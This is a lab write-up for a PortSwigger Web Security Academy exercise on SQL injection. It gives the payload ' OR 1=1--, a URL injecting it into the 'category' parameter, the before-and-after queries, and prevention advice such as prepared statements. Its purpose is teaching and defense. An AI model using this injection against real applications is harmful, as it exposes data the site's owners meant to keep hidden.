SQL Injection: Retrieving Hidden Data

---

Category: SQL Injection
Difficulty: Apprentice
Lab Link: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

---

Vulnerability-

The application constructs a SQL query using user input from the "category" parameter without proper sanitization.
This allows an attacker to manipulate the SQL query and bypass the condition that hides unreleased products.

---

Payload-

' OR 1=1--

---

Exploitation Steps-

1. Navigate to a product category on the lab.
2. Observe the URL parameter:

/filter?category=Gifts

3. Inject the payload into the "category" parameter:

/filter?category=Gifts' OR 1=1--

4. The injected condition modifies the SQL query logic and returns all products, including hidden ones.

---

Why the Attack Works

Original query (approximation):-

SELECT * FROM products WHERE category='Gifts' AND released=1

Injected query becomes:-

SELECT * FROM products WHERE category='Gifts' OR 1=1--' AND released=1

- "OR 1=1" always evaluates to true
- "--" comments out the remaining query

This causes the database to return all rows, including hidden products.

---

Prevention-

- Use parameterized queries / prepared statements
- Validate and sanitize user input
- Avoid concatenating user input directly into SQL queries

